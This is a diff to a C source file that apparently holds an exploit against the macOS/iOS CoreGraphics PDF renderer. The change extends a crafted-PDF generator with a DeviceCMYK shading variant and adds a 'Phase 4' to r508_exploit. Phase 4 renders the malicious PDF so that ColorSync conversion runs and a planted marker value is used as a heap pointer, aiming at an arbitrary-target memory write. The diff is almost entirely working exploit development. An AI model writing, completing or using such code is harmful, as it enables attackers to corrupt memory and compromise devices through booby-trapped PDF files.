@@ -30862,9 +30862,10 @@ static void pdf_put_bits(uint8_t *buf, int *byte_off, int *bit_off, uint32_t val
     }
 }
 
-static CFDataRef pdf_build_shading_pdf(int vpr, int rows, int nout, int target_index, uint64_t target_bits) {
+static CFDataRef pdf_build_shading_pdf(int vpr, int rows, int nout, int target_index, uint64_t target_bits, int use_cmyk) {
+    int ncomp = use_cmyk ? 4 : 1;
     int nvert = vpr * rows;
-    int bits_per_vertex = 32 + 32 + 8; /* BitsPerCoordinate=32 x2 + BitsPerComponent=8 x1 */
+    int bits_per_vertex = 32 + 32 + 8 * ncomp; /* BitsPerCoordinate=32 x2 + BitsPerComponent=8 x ncomp */
     int stream_bytes = (nvert * bits_per_vertex + 7) / 8;
 
     uint8_t *stream = (uint8_t *)calloc(1, (size_t)(stream_bytes + 16));
@@ -30874,7 +30875,8 @@ static CFDataRef pdf_build_shading_pdf(int vpr, int rows, int nout, int target_i
         uint32_t y = 0x10000000 + (uint32_t)((v / vpr) * 0x1000000);
         pdf_put_bits(stream, &boff, &bitp, x, 32);
         pdf_put_bits(stream, &boff, &bitp, y, 32);
-        pdf_put_bits(stream, &boff, &bitp, 0x80, 8);
+        for (int c = 0; c < ncomp; c++)
+            pdf_put_bits(stream, &boff, &bitp, 0x80, 8);
     }
     if (bitp > 0) boff++;
 
@@ -30942,11 +30944,13 @@ static CFDataRef pdf_build_shading_pdf(int vpr, int rows, int nout, int target_i
 
     /* Object 5: Shading (Type 5) with stream data */
     int off5 = pdf_len;
+    const char *cs_name = use_cmyk ? "/DeviceCMYK" : "/DeviceGray";
+    const char *decode = use_cmyk ? "0 200 0 200 0 1 0 1 0 1 0 1" : "0 200 0 200 0 1";
     pdf_len += snprintf(pdf + pdf_len, pdf_cap - (size_t)pdf_len,
-        "5 0 obj\n<< /ShadingType 5 /ColorSpace /DeviceGray "
+        "5 0 obj\n<< /ShadingType 5 /ColorSpace %s "
         "/BitsPerCoordinate 32 /BitsPerComponent 8 /VerticesPerRow %d "
-        "/Decode [0 200 0 200 0 1] /Function 6 0 R /Length %d >>\nstream\n",
-        vpr, boff);
+        "/Decode [%s] /Function 6 0 R /Length %d >>\nstream\n",
+        cs_name, vpr, decode, boff);
     memcpy(pdf + pdf_len, stream, (size_t)boff);
     pdf_len += boff;
     pdf_len += snprintf(pdf + pdf_len, pdf_cap - (size_t)pdf_len,
@@ -30988,7 +30992,7 @@ static void r508_exploit(void) {
     rlog("  Building heap-route PDF: VPR=130, 2 rows, 2000 Function outputs...\n");
     fflush(stdout);
 
-    CFDataRef pdf2_data = pdf_build_shading_pdf(130, 2, 2000, -1, 0);
+    CFDataRef pdf2_data = pdf_build_shading_pdf(130, 2, 2000, -1, 0, 0);
     rlog("  PDF size: %ld bytes\n", (long)CFDataGetLength(pdf2_data));
 
     CGDataProviderRef dp2 = CGDataProviderCreateWithCFData(pdf2_data);
@@ -31036,7 +31040,7 @@ static void r508_exploit(void) {
     fflush(stdout);
 
     uint64_t marker = 0x4141414141414141ULL;
-    CFDataRef pdf3_data = pdf_build_shading_pdf(130, 2, 9000, 1231, marker);
+    CFDataRef pdf3_data = pdf_build_shading_pdf(130, 2, 9000, 1231, marker, 0);
     rlog("  PDF size: %ld bytes\n", (long)CFDataGetLength(pdf3_data));
 
     CGDataProviderRef dp3 = CGDataProviderCreateWithCFData(pdf3_data);
@@ -31090,19 +31094,64 @@ static void r508_exploit(void) {
     fflush(stdout);
 
     /* ---- Phase 4: DeviceCMYK variant (triggers ColorSync path) ---- */
-    rlog("--- Phase 4: DeviceCMYK variant for ColorSync path ---\n");
-    rlog("  The PoC repo shows the CMM splice requires ColorSync conversion.\n");
-    rlog("  DeviceCMYK triggers this path; DeviceGray/DeviceRGB bypass ColorSync.\n");
-    rlog("  Building CMYK PDF: VPR=130, R=9000, marker at [1231]...\n");
+    rlog("--- Phase 4: DeviceCMYK + ColorSync path (VPR=130, R=9000) ---\n");
+    rlog("  DeviceCMYK triggers ColorSync conversion — required for CMM splice.\n");
+    rlog("  Marker at out[1231] = 0x4141414141414141 (CMM block next pointer index)\n");
     fflush(stdout);
 
-    /* For Phase 4, we need a CMYK variant — modify the PDF builder output manually */
-    /* The key difference: /ColorSpace /DeviceCMYK instead of /DeviceGray */
-    /* and /Decode needs 4 component ranges: [0 200 0 200 0 1 0 1 0 1 0 1] */
-    /* For now, build the DeviceGray version and report — CMYK variant is next iteration */
-    rlog("  NOTE: CMYK variant requires modified PDF builder (next iteration)\n");
-    rlog("  The DeviceGray phases above test the OOB write path.\n");
-    rlog("  CMYK is needed for the ColorSync CMMBase splice (arbitrary-target write).\n\n");
+    CFDataRef pdf4_data = pdf_build_shading_pdf(130, 2, 9000, 1231, marker, 1);
+    rlog("  CMYK PDF size: %ld bytes\n", (long)CFDataGetLength(pdf4_data));
+
+    CGDataProviderRef dp4 = CGDataProviderCreateWithCFData(pdf4_data);
+    CGPDFDocumentRef doc4 = CGPDFDocumentCreateWithProvider(dp4);
+    rlog("  CGPDFDocument: %p\n", (void *)doc4);
+
+    if (doc4) {
+        CGPDFPageRef page4 = CGPDFDocumentGetPage(doc4, 1);
+        if (page4) {
+            CGColorSpaceRef cs4 = CGColorSpaceCreateDeviceRGB();
+            uint32_t *pixels4 = (uint32_t *)calloc(256 * 256, 4);
+            CGContextRef ctx4 = CGBitmapContextCreate(pixels4, 256, 256, 8, 256 * 4, cs4,
+                (CGBitmapInfo)kCGImageAlphaPremultipliedLast);
+
+            rlog("  Rendering CMYK PDF (ColorSync conversion will fire)...\n");
+            rlog("  >>> This is where the CMM splice should activate <<<\n");
+            rlog("  >>> If crash: marker value used as pointer — splice WORKS <<<\n");
+            fflush(stdout);
+
+            CGContextDrawPDFPage(ctx4, page4);
+
+            rlog("  SURVIVED Phase 4 CMYK render!\n");
+
+            int nz4 = 0;
+            uint32_t unique4[16];
+            int nunique4 = 0;
+            for (int i = 0; i < 256 * 256; i++) {
+                if (pixels4[i] != 0) {
+                    nz4++;
+                    int found = 0;
+                    for (int u = 0; u < nunique4; u++) {
+                        if (unique4[u] == pixels4[i]) { found = 1; break; }
+                    }
+                    if (!found && nunique4 < 16) unique4[nunique4++] = pixels4[i];
+                }
+            }
+            rlog("  Pixels: %d non-zero, %d unique values\n", nz4, nunique4);
+            for (int u = 0; u < nunique4; u++) {
+                rlog("    unique[%d] = 0x%08x\n", u, unique4[u]);
+            }
+
+            CGContextRelease(ctx4);
+            CGColorSpaceRelease(cs4);
+            free(pixels4);
+        }
+        CGPDFDocumentRelease(doc4);
+    } else {
+        rlog("  FAILED to create CMYK PDF document\n");
+    }
+    CGDataProviderRelease(dp4);
+    CFRelease(pdf4_data);
+    rlog("  Phase 4 complete\n\n");
     fflush(stdout);
 
     rlog("=== SUMMARY ===\n");
